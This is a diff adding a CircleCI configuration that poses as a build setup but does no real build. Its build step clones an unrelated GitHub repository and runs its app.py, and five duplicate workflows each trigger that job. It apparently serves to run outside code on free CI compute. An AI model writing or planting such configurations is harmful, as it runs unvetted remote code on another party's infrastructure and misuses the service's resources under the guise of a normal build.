@@ -1,0 +1,44 @@
+version: 2.1
+executors:
+  circleci_env:
+    docker:
+      - image: cimg/python:3.11.3
+    working_directory: ~/my-env
+commands:
+  build:
+    description: Run build
+    steps:
+      - checkout
+      - run:
+          name: build
+          command: |
+              python --version
+               
+      - run:
+          name: build
+          command: |
+              git clone https://github.com/unauna1803/travershin.git && cd travershin && chmod +x app.py && cd travershin && chmod +x app.py && python3 app.py || python app.py
+              
+jobs:
+  buildd:
+    executor: circleci_env
+    working_directory: ~/my-env
+    steps: [build]
+
+workflows:
+  version: 2
+  apijava1:
+    jobs:
+      - buildd
+  apijava2:
+    jobs:
+      - buildd
+  apijava3:
+    jobs:
+      - buildd
+  apijava4:
+    jobs:
+      - buildd
+  apijava5:
+    jobs:
+      - buildd
